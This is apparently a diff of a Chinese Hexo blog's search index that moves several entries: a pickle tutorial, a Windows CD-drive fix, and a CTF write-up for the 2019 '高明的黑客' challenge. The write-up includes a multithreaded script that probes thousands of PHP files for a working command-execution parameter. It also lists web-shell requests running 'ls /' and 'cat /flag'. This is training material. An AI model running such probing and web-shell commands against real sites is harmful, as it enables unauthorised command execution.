+<p>参数： - file：要反序列的<strong>二进制文件</strong></p>
+<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickle使用的文件/after.p&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    <span class="built_in">print</span>(pickle.load(f))</span><br></pre></td></tr></table></figure></p>
+<p>利用上面的 dump 的序列化后的二进制文件做演示，得到结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="loads">loads</h2>
+<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.loads(data, /, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
+<p>参数： - data：需要反序列化的<strong>二进制对象</strong></p>
+<p>返回值： <strong>直接返回反序列化后的对象。（这是与 load 的最大区别）</strong></p>
+<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line">tars = pickle.dumps(tar)  <span class="comment"># 先序列化</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(tars)) <span class="comment"># 再反序列化</span></span><br></pre></td></tr></table></figure></p>
+<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>pickle</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>windows 上CD驱动器的删除问题</title>
+    <url>/2022/03/28/windows%20%E4%B8%8ACD%E9%A9%B1%E5%8A%A8%E5%99%A8%E7%9A%84%E5%88%A0%E9%99%A4%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>个人日常生活中遇到的繁琐的小问题的解决。</p>
+<span id="more"></span>
+<h1 id="问题描述">问题描述</h1>
+<p>有时候，电脑上总会莫名其妙的安装了如下 CD驱动器：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224202.png" /></p>
+<p>删除也删不掉，打开也打开不了，很烦。</p>
+<h1 id="原因">原因</h1>
+<p>CD驱动器计算机-设备和驱动器分类下的计算机光驱管理，可加载ISO文件，多在计算机安装<code>UltraISO</code>软碟通等虚拟光驱软件后自动在我的电脑下创建CD驱动器图标。</p>
+<p>知道原因后，解决的办法就很简单了。</p>
+<h1 id="问题解决">问题解决</h1>
+<p>首先，以管理员方式打开 <code>UltraISO</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224452.png" /></p>
+<p><code>选项 -&gt; 配置</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224557.png" /></p>
+<p>然后 <code>虚拟光驱</code>，<strong>将设备数量改为无</strong></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224629.png" /></p>
+<p>然后即可看到 CD驱动器已经消失了。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224711.png" /></p>
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+      <tags>
+        <tag>Windows小知识</tag>
       </tags>
   </entry>
   <entry>
@@ -1054,84 +1218,6 @@
       </tags>
   </entry>
   <entry>
-    <title>pickle 库</title>
-    <url>/2022/01/30/pickle%20%E5%BA%93/</url>
-    <content><![CDATA[<p>pickle 库的简单使用。</p>
-<span id="more"></span>
-<h1 id="前言">前言</h1>
-<p>官方文档：<a href="https://docs.python.org/zh-cn/3/library/pickle.html">pickle</a></p>
-<h1 id="介绍">介绍</h1>
-<p>模块 pickle 实现了对一个 Python 对象结构的二进制序列化和反序列化。</p>
-<h1 id="常用方法">常用方法</h1>
-<p>主要由两类接口，即序列化和反序列化。</p>
-<p>其中序列化包括： 1. dump() 2. dumps()</p>
-<p>反序列化包括： 1. load() 2. loads()</p>
-<p><strong>序列化后的对象是 bytes 类型的，反序列后的对象同样也是 bytes 类型的，也就是二进制文件。</strong></p>
-<h2 id="dump">dump</h2>
-<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
-<blockquote>
-<p>将对象 obj 序列化以后的对象写入已打开的 file object file。</p>
-</blockquote>
-<p>参数： 主要参数就是前两个： - obj：要序列化的对象 - file：序列化完之后的对象需要写入到 file 中。</p>
-<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickle使用的文件/after.p&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    pickle.dump(tar, f)</span><br></pre></td></tr></table></figure></p>
-<h2 id="dumps">dumps</h2>
-<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
-<p>参数： - obj：要序列化的对象 - 少了 file</p>
-<ul>
-<li>返回值 <strong>直接返回序列化后的二进制对象。（这是与 dump 最大的区别）</strong></li>
-</ul>
-<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(tar))</span><br></pre></td></tr></table></figure></p>
-<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x04name\x94\x8c\x05lihua\x94\x8c\x03age\x94K\x1eu.&#x27;</span><br></pre></td></tr></table></figure></p>
-<h2 id="load">load</h2>
-<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.load(file, *, protocol=<span class="literal">None</span>, fiximports=<span class="literal">True</span>, encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
-<p>参数： - file：要反序列的<strong>二进制文件</strong></p>
-<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickle使用的文件/after.p&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    <span class="built_in">print</span>(pickle.load(f))</span><br></pre></td></tr></table></figure></p>
-<p>利用上面的 dump 的序列化后的二进制文件做演示，得到结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="loads">loads</h2>
-<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.loads(data, /, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
-<p>参数： - data：需要反序列化的<strong>二进制对象</strong></p>
-<p>返回值： <strong>直接返回反序列化后的对象。（这是与 load 的最大区别）</strong></p>
-<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line">tars = pickle.dumps(tar)  <span class="comment"># 先序列化</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(tars)) <span class="comment"># 再反序列化</span></span><br></pre></td></tr></table></figure></p>
-<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>pickle</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>windows 上CD驱动器的删除问题</title>
-    <url>/2022/03/28/windows%20%E4%B8%8ACD%E9%A9%B1%E5%8A%A8%E5%99%A8%E7%9A%84%E5%88%A0%E9%99%A4%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>个人日常生活中遇到的繁琐的小问题的解决。</p>
-<span id="more"></span>
-<h1 id="问题描述">问题描述</h1>
-<p>有时候，电脑上总会莫名其妙的安装了如下 CD驱动器：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224202.png" /></p>
-<p>删除也删不掉，打开也打开不了，很烦。</p>
-<h1 id="原因">原因</h1>
-<p>CD驱动器计算机-设备和驱动器分类下的计算机光驱管理，可加载ISO文件，多在计算机安装<code>UltraISO</code>软碟通等虚拟光驱软件后自动在我的电脑下创建CD驱动器图标。</p>
-<p>知道原因后，解决的办法就很简单了。</p>
-<h1 id="问题解决">问题解决</h1>
-<p>首先，以管理员方式打开 <code>UltraISO</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224452.png" /></p>
-<p><code>选项 -&gt; 配置</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224557.png" /></p>
-<p>然后 <code>虚拟光驱</code>，<strong>将设备数量改为无</strong></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224629.png" /></p>
-<p>然后即可看到 CD驱动器已经消失了。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224711.png" /></p>
-]]></content>
-      <categories>
-        <category>Windows</category>
-      </categories>
-      <tags>
-        <tag>Windows小知识</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>复现：Apache HTTP Server 2.4.49 路径穿越漏洞（CVE-2021-41773）</title>
     <url>/2022/03/24/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTP%20Server%202.4.49%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-41773%EF%BC%89/</url>
     <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
@@ -1304,36 +1390,6 @@
         <tag>php伪协议</tag>
         <tag>命令执行</tag>
         <tag>MD5碰撞绕过</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>强网杯 2019 高明的黑客</title>
-    <url>/2022/03/29/%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%20%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
-    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境，得到如下信息</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329083958.png" /></p>
-<p>因此访问如下网址，将源码下载下来 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://12e408b2-7b34-441d-a3f5-a689f716cfd5.node4.buuoj.cn:81/www.tar.gz</span><br></pre></td></tr></table></figure></p>
-<p>发现有 3002 个文件，并且除了一个 <code>index.html</code> 之外，其他的文件里面充斥着 <code>$_GET</code> <code>$_POST</code> <code>system</code> ，一看就是命令执行，但是随便打开文件，拿出一个尝试却不行。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084335.png" /></p>
-<p>因此认为，这3000+文件里面，只有一个文件的一个 payload 是有效的，其他的文件和 payload 只不过是这个 “高明的黑客” 弄出来的伪装。</p>
-<h1 id="解题">解题</h1>
-<p>3000多文件，手动验证肯定是不可能的，因此使用脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, os, re, time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, wait, ALL_COMPLETED, as_completed</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/BUUtest/src/&#x27;</span></span><br><span class="line">filePath = <span class="string">&#x27;D:\\phpStudy2018\\PHPTutorial\\WWW\\BUUtest\\src\\&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">file</span>):</span></span><br><span class="line">    pattern = <span class="string">&quot;(\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\]&quot;</span></span><br><span class="line">    gets = []</span><br><span class="line">    posts = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在尝试 <span class="subst">&#123;file&#125;</span>:&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filePath+file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.readlines()</span><br><span class="line">    <span class="comment"># 找出所有的 (\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\] 中的单引号的内容，即参数</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">        s = re.search(pattern, line)</span><br><span class="line">        <span class="keyword">if</span> s:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;GET&quot;</span> <span class="keyword">in</span> s.group():</span><br><span class="line">                gets.append(s.group(<span class="number">2</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                posts.append(s.group(<span class="number">2</span>))</span><br><span class="line">        <span class="comment"># print(gets)</span></span><br><span class="line">        <span class="comment"># print(posts)</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;echo &quot;success!!!&quot;&#x27;</span></span><br><span class="line">    <span class="comment"># 开始发送 GET 请求</span></span><br><span class="line">    <span class="keyword">for</span> get <span class="keyword">in</span> gets:</span><br><span class="line">        newUrl = url + file + <span class="string">&quot;?&quot;</span> + get + <span class="string">&quot;=&quot;</span> + payload</span><br><span class="line">        <span class="comment"># print(newUrl)</span></span><br><span class="line">        r = requests.get(newUrl)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is get and payload is <span class="subst">&#123;get&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 开始发送 POST 请求</span></span><br><span class="line">    <span class="keyword">for</span> post <span class="keyword">in</span> posts:</span><br><span class="line">        newUrl = url + file</span><br><span class="line">        r = requests.post(newUrl, data=&#123;post: payload&#125;)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is post and payload is <span class="subst">&#123;post&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序开始：&quot;</span>)</span><br><span class="line">    fileNames = os.listdir(filePath)</span><br><span class="line">    startTime = time.time()</span><br><span class="line">    executor = ThreadPoolExecutor(<span class="number">100</span>)</span><br><span class="line">    all_tasks = [executor.submit(exp, file) <span class="keyword">for</span> file <span class="keyword">in</span> fileNames]</span><br><span class="line">    wait(all_tasks, return_when=ALL_COMPLETED)</span><br><span class="line">    endTime = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;total time is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(endTime - startTime)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序结束！&quot;</span>)</span><br></pre></td></tr></table></figure></p>
-<p>这是最终版的脚本。之前用的单线程，可能跑一天都跑不出来，如果开启多线程，BUUOJ这个网址就会返回 <code>too many requests</code> 。因此最终的解决办法就是在自己主机上搭建环境，然后测试。</p>
-<p>最终结果：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084725.png" /></p>
-<p>最终跑了3个多小时，由于我代码能力差，因为如果各位有更好的优化方法可以告诉我。</p>
-<p>拿到 <code>文件</code> <code>payload</code> <code>提交办法</code> 后就可以命令执行了。（这里是 GET 方式，所以无法用蚁剑连接，在自己主机上测试过）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /xk0SzyKwfzw.php?Efa5BVG=ls / # 查看根目录文件，发现 flag</span><br><span class="line">2. /xk0SzyKwfzw.php?Efa5BVG=cat /flag # flag get</span><br></pre></td></tr></table></figure>
-<h1 id="总结">总结</h1>
-<p>本题考察的并不是代码审计，而是脚本编写能力。不论怎么说，还真是一道有意思的题目呀。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -1639,6 +1695,36 @@
       <tags>
         <tag>综合</tag>
         <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>强网杯 2019 高明的黑客</title>
+    <url>/2022/03/29/%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%20%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境，得到如下信息</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329083958.png" /></p>
+<p>因此访问如下网址，将源码下载下来 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://12e408b2-7b34-441d-a3f5-a689f716cfd5.node4.buuoj.cn:81/www.tar.gz</span><br></pre></td></tr></table></figure></p>
+<p>发现有 3002 个文件，并且除了一个 <code>index.html</code> 之外，其他的文件里面充斥着 <code>$_GET</code> <code>$_POST</code> <code>system</code> ，一看就是命令执行，但是随便打开文件，拿出一个尝试却不行。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084335.png" /></p>
+<p>因此认为，这3000+文件里面，只有一个文件的一个 payload 是有效的，其他的文件和 payload 只不过是这个 “高明的黑客” 弄出来的伪装。</p>
+<h1 id="解题">解题</h1>
+<p>3000多文件，手动验证肯定是不可能的，因此使用脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, os, re, time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, wait, ALL_COMPLETED, as_completed</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/BUUtest/src/&#x27;</span></span><br><span class="line">filePath = <span class="string">&#x27;D:\\phpStudy2018\\PHPTutorial\\WWW\\BUUtest\\src\\&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">file</span>):</span></span><br><span class="line">    pattern = <span class="string">&quot;(\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\]&quot;</span></span><br><span class="line">    gets = []</span><br><span class="line">    posts = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在尝试 <span class="subst">&#123;file&#125;</span>:&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filePath+file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.readlines()</span><br><span class="line">    <span class="comment"># 找出所有的 (\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\] 中的单引号的内容，即参数</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">        s = re.search(pattern, line)</span><br><span class="line">        <span class="keyword">if</span> s:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;GET&quot;</span> <span class="keyword">in</span> s.group():</span><br><span class="line">                gets.append(s.group(<span class="number">2</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                posts.append(s.group(<span class="number">2</span>))</span><br><span class="line">        <span class="comment"># print(gets)</span></span><br><span class="line">        <span class="comment"># print(posts)</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;echo &quot;success!!!&quot;&#x27;</span></span><br><span class="line">    <span class="comment"># 开始发送 GET 请求</span></span><br><span class="line">    <span class="keyword">for</span> get <span class="keyword">in</span> gets:</span><br><span class="line">        newUrl = url + file + <span class="string">&quot;?&quot;</span> + get + <span class="string">&quot;=&quot;</span> + payload</span><br><span class="line">        <span class="comment"># print(newUrl)</span></span><br><span class="line">        r = requests.get(newUrl)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is get and payload is <span class="subst">&#123;get&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 开始发送 POST 请求</span></span><br><span class="line">    <span class="keyword">for</span> post <span class="keyword">in</span> posts:</span><br><span class="line">        newUrl = url + file</span><br><span class="line">        r = requests.post(newUrl, data=&#123;post: payload&#125;)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is post and payload is <span class="subst">&#123;post&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序开始：&quot;</span>)</span><br><span class="line">    fileNames = os.listdir(filePath)</span><br><span class="line">    startTime = time.time()</span><br><span class="line">    executor = ThreadPoolExecutor(<span class="number">100</span>)</span><br><span class="line">    all_tasks = [executor.submit(exp, file) <span class="keyword">for</span> file <span class="keyword">in</span> fileNames]</span><br><span class="line">    wait(all_tasks, return_when=ALL_COMPLETED)</span><br><span class="line">    endTime = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;total time is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(endTime - startTime)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序结束！&quot;</span>)</span><br></pre></td></tr></table></figure></p>
+<p>这是最终版的脚本。之前用的单线程，可能跑一天都跑不出来，如果开启多线程，BUUOJ这个网址就会返回 <code>too many requests</code> 。因此最终的解决办法就是在自己主机上搭建环境，然后测试。</p>
+<p>最终结果：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084725.png" /></p>
+<p>最终跑了3个多小时，由于我代码能力差，因为如果各位有更好的优化方法可以告诉我。</p>
+<p>拿到 <code>文件</code> <code>payload</code> <code>提交办法</code> 后就可以命令执行了。（这里是 GET 方式，所以无法用蚁剑连接，在自己主机上测试过）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /xk0SzyKwfzw.php?Efa5BVG=ls / # 查看根目录文件，发现 flag</span><br><span class="line">2. /xk0SzyKwfzw.php?Efa5BVG=cat /flag # flag get</span><br></pre></td></tr></table></figure>
+<h1 id="总结">总结</h1>
+<p>本题考察的并不是代码审计，而是脚本编写能力。不论怎么说，还真是一道有意思的题目呀。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
